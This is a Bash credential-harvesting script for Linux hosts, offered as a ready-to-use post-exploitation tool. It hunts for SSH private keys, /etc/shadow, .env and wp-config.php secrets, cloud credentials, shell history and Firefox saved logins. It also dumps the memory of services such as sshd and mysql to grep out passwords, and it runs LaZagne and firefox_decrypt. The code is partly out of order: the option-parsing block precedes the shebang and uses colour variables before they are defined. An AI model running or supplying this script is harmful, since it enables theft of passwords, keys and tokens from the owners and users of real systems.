# --- Variables ---
OUTPUT_FILE=""
SKIP_MEMORY=false

# --- Usage Function ---
usage() {
    echo -e "${CYAN}Usage: $0 [OPTIONS]${NC}"
    echo -e "Options:"
    echo -e "  -o <file>   Save output to a file (e.g., loot.txt)"
    echo -e "  -m          Skip memory dumping (Stealth mode)"
    echo -e "  -h          Show this help message"
    echo -e ""
    exit 1
}

# --- Argument Parsing ---
while getopts ":o:mh" opt; do
  case ${opt} in
    o) OUTPUT_FILE=$OPTARG ;;
    m) SKIP_MEMORY=true ;;
    h) usage ;;
    \?) echo -e "${RED}Invalid option: -$OPTARG${NC}" >&2; usage ;;
  esac
done

# --- Output Redirection Logic ---
# If an output file is specified, we need to pipe stdout to tee
if [ ! -z "$OUTPUT_FILE" ]; then
    exec > >(tee -i "$OUTPUT_FILE") 2>&1
    echo -e "${GREEN}[+] Logging session to: $OUTPUT_FILE${NC}"
fi

#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[1;35m' # CRITICAL HIT
CYAN='\033[0;36m'
NC='\033[0m' 

echo -e "${BLUE}"
echo "========================================================"
echo "   LINUX CREDENTIAL HUNTING (v10 - FIREFOX EDITION)"
echo "========================================================"
echo -e "${NC}"

# --- Checks ---
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] WARNING: Not running as root. Many files/processes will be hidden.${NC}"
  echo -e "${YELLOW}[!] Recommended: sudo $0${NC}\n"
fi

# --- Helper Function ---
analyze_file() {
    local filepath=$1
    local filename=$(basename "$filepath")
    
    # High Value Targets
    if [[ "$filename" == "id_rsa" ]] || [[ "$filename" == "shadow" ]] || \
       [[ "$filename" == ".env" ]] || [[ "$filename" == "wp-config.php" ]] || \
       [[ "$filename" == "logins.json" ]] || [[ "$filepath" == *".aws/credentials"* ]] || \
       [[ "$filename" == "azure_profile" ]]; then
        echo -e "${MAGENTA}[!!!] JACKPOT FOUND: $filepath${NC}"
        
        # Peek at the file content for context (safely)
        if [[ -r "$filepath" ]] && [[ -f "$filepath" ]]; then
             grep -E "DB_|USER|KEY|SECRET|TOKEN" "$filepath" 2>/dev/null | head -n 3 | awk '{print "      > " $0}'
        fi
    else
        echo -e "    ${CYAN}[+] Found:${NC} $filepath"
    fi
}

print_header() {
    echo -e "\n${YELLOW}--------------------------------------------------------"
    echo -e " $1"
    echo -e "--------------------------------------------------------${NC}"
}

# Common exclusion flags to prevent hanging on network shares or proc
EXCLUDES="-path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /run -prune -o -path /mnt -prune -o -path /media -prune -o"

# ------------------------------------------------------------------
# 1. FILES (Configs, DBs, Notes, Scripts, Source, Cron, SSH)
# ------------------------------------------------------------------
print_header "1. FILES & STORAGE"

echo -e "${GREEN}[*] SSH Keys & Cloud Credentials...${NC}"
find /home /root /tmp $EXCLUDES -type f \( -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "known_hosts" \) 2>/dev/null | while read f; do analyze_file "$f"; done
find /home /root $EXCLUDES -type d \( -name ".aws" -o -name ".azure" -o -name ".gcp" -o -name ".kube" \) 2>/dev/null

echo -e "\n${GREEN}[*] Configuration Files (Web & App)...${NC}"
find /var/www /home /etc /opt $EXCLUDES -type f \( -name ".env" -o -name "wp-config.php" -o -name "settings.py" -o -name "config.php" -o -name "*.cnf" \) 2>/dev/null | head -n 20 | while read f; do analyze_file "$f"; done

echo -e "\n${GREEN}[*] Databases...${NC}"
find /home /var /opt $EXCLUDES -type f \( -name "*.db" -o -name "*.sql" -o -name "*.sqlite" -o -name "*.kdbx" \) 2>/dev/null | head -n 10 | while read f; do analyze_file "$f"; done

echo -e "\n${GREEN}[*] Human Notes (pass/secret/key)...${NC}"
find /home /root $EXCLUDES -type f \( -name "*pass*.txt" -o -name "*secret*.txt" -o -name "*creds*" \) 2>/dev/null | head -n 10

echo -e "\n${GREEN}[*] Cronjobs...${NC}"
if [ -f /etc/crontab ]; then
    echo -e "    ${CYAN}[+] System Crontab:${NC}"
    grep -v "^#" /etc/crontab | head -n 5
fi
ls -la /var/spool/cron/crontabs 2>/dev/null

# ------------------------------------------------------------------
# 2. HISTORY & LOGS
# ------------------------------------------------------------------
print_header "2. HISTORY & LOGS"

echo -e "${GREEN}[*] Scanning Bash History & Configs for Secrets...${NC}"
find /home /root -name ".*history" 2>/dev/null | while read hf; do
    echo -e "${CYAN}[+] Scanning: $hf${NC}"
    grep --color=always -E "AKIA[0-9A-Z]{16}|Bearer [a-zA-Z0-9\-\._~\+\/]+=*|password=|pass =|Authorization|ssh-rsa" "$hf" | tail -n 5
done

echo -e "\n${GREEN}[*] Auth Logs...${NC}"
grep -Ei "accepted|session opened" /var/log/auth.log /var/log/syslog 2>/dev/null | tail -n 5

# ------------------------------------------------------------------
# 3. KEY-RINGS & BROWSERS
# ------------------------------------------------------------------
print_header "3. KEY-RINGS & BROWSERS"
# Locating Firefox Profiles specifically
echo -e "${GREEN}[*] Searching for Firefox Profiles (logins.json + key4.db)...${NC}"
find /home $EXCLUDES -type f \( -name "logins.json" -o -name "key4.db" \) 2>/dev/null | while read f; do analyze_file "$f"; done

# ------------------------------------------------------------------
# 4. MEMORY (Gcore Interactive)
# ------------------------------------------------------------------
print_header "4. MEMORY DUMPING"

if command -v gcore &>/dev/null; then
    echo -e "${YELLOW}[B] Process Memory Dump (Gcore)${NC}"
    echo -e "${RED}[!] WARNING: Dumping memory pauses the target process.${NC}"
    echo -e "${GREEN}[*] Listing interesting processes...${NC}"
    
    ps -eo pid,user,comm,cmd | grep -v grep | grep -Ei "sshd|apache|nginx|mysql|postgres|redis|python|flask" | head -n 15
    
    echo -e "\n"
    read -p "Enter PID to dump (or ENTER to skip): " target_pid
    
    if [[ -n "$target_pid" ]]; then
        OUTPUT_FILE="dump_${target_pid}.core"
        echo -e "${GREEN}[*] Dumping PID $target_pid...${NC}"
        
        gcore -o "$OUTPUT_FILE" "$target_pid" &>/dev/null
        REAL_FILE=$(ls dump_${target_pid}.core* 2>/dev/null | head -n 1)
        
        if [[ -f "$REAL_FILE" ]]; then
            echo -e "${MAGENTA}[!!!] Dump Successful: $REAL_FILE${NC}"
            echo -e "${YELLOW}[*] Extracting strings (Min length: 8)...${NC}"
            
            strings -n 8 "$REAL_FILE" | grep -E "pass=|PASS=|User=|USER=|Authorization: |Bearer |AWS_ACCESS|DB_HOST|mysql://" | head -n 20
            
            read -p "Delete dump file? (y/N): " del_dump
            if [[ "$del_dump" =~ ^[Yy]$ ]]; then
                rm "$REAL_FILE"
                echo "Deleted."
            fi
        else
            echo -e "${RED}[-] Gcore failed. Process might be owned by root or protected.${NC}"
        fi
    else
        echo "Skipping memory dump."
    fi
else
    echo -e "${RED}[-] 'gcore' not found. Install gdb or use manual /proc/mem extraction.${NC}"
fi

# ------------------------------------------------------------------
# 5. TOOLS EXECUTION (Local & Remote)
# ------------------------------------------------------------------
print_header "5. EXECUTING TOOLS"

# Get the directory where the script is running
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
TOOLS_DIR="$SCRIPT_DIR/tools"

FOUND_PYTHON=false

# 1. Detect Python Version
for py_cmd in python3 python python2; do
    if command -v "$py_cmd" &>/dev/null; then
        FOUND_PYTHON=true
        echo -e "${GREEN}[+] Python found: $py_cmd${NC}"
        
        # --- TOOL 1: LaZagne ---
        if [ -f "$TOOLS_DIR/laZagne.py" ]; then
            echo -e "${YELLOW}[*] Running local LaZagne...${NC}"
            $py_cmd "$TOOLS_DIR/laZagne.py" all 
        else
            echo -e "${RED}[-] LaZagne not found locally.${NC}"
            echo -e "    Download it: https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/laZagne.py"
        fi

        echo ""

        # --- TOOL 2: Firefox Decrypt ---
        # Only run if we actually found profiles earlier
        if [ -f "$TOOLS_DIR/firefox_decrypt.py" ]; then
             echo -e "${YELLOW}[*] Running local Firefox Decrypt...${NC}"
             # Find profiles again to feed into the tool
             find /home -name "profiles.ini" 2>/dev/null | while read profile_path; do
                 profile_dir=$(dirname "$profile_path")
                 echo -e "${CYAN}    Targeting: $profile_dir${NC}"
                 $py_cmd "$TOOLS_DIR/firefox_decrypt.py" "$profile_dir"
             done
        else
             echo -e "${RED}[-] firefox_decrypt.py not found locally.${NC}"
             echo -e "    Download it: https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py"
        fi
        
     # Stop after finding one valid python version
    fi
done

if [ "$FOUND_PYTHON" = false ]; then
    echo -e "${RED}[-] No Python interpreter found on system.${NC}"
fi

echo -e "\n${BLUE}========================================================"
echo "                 HUNTING COMPLETE"
echo "========================================================${NC}"